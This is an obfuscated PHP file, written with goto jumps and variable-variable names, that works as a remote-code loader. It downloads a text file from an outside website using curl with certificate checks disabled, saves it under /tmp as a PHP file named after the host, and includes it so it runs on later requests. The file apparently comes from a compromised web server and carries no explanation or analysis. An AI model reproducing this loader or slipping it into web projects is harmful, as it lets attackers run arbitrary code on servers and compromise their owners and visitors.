<?php
goto pDqo7;
MDLMx:
${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]} = array("https://keloz.com.br/sistema/adm/jquery-upload/server/php/marijuana.txt", "/tmp/sesss_" . md5(${${"GLOBALS"}["ojxbegrrd_vvrczjguryftrza_qydbtbjalurxyf"]}["HTTP_HOST"]) . ".php");
goto ZFb8s;
ZFb8s:
if (file_exists(${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]}[1]) && filesize(${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]}[1]) !== 0) {
    include ${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]}[1];
} else {
    ${${"GLOBALS"}["t_dmnlchagazasrz_czknnjjkts_bvhbsdgxoq"]} = fopen(${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]}[1], "w+");
    fwrite(${${"GLOBALS"}["t_dmnlchagazasrz_czknnjjkts_bvhbsdgxoq"]}, get(${${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"]}[0]));
    fclose(${${"GLOBALS"}["t_dmnlchagazasrz_czknnjjkts_bvhbsdgxoq"]});
    echo "<script>window.location=?zet;</script>";
}
goto Z6ugb;
pDqo7:
${"GLOBALS"}["rpdjvbszirnfrzm_zjs_ysmrqnsgz"] = "data";
goto lNdfN;
eUW_0:
${"GLOBALS"}["zalywttqeuqdee_twk_ix"] = "ch";
goto RYoWH;
lNdfN:
${"GLOBALS"}["ojxbegrrd_vvrczjguryftrza_qydbtbjalurxyf"] = "_SERVER";
goto O5Rwr;
O5Rwr:
${"GLOBALS"}["t_dmnlchagazasrz_czknnjjkts_bvhbsdgxoq"] = "fopen";
goto eUW_0;
RYoWH:
${"GLOBALS"}["dzrivgxrevrn_vq_hmemyhawabzwmvk"] = "url";
goto MDLMx;
Z6ugb:
function get($url)
{
    ${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]} = curl_init();
    curl_setopt(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]}, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]}, CURLOPT_URL, ${${"GLOBALS"}["dzrivgxrevrn_vq_hmemyhawabzwmvk"]});
    curl_setopt(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]}, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]}, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]});
    curl_close(${${"GLOBALS"}["zalywttqeuqdee_twk_ix"]});
}
goto djT_S;
djT_S:
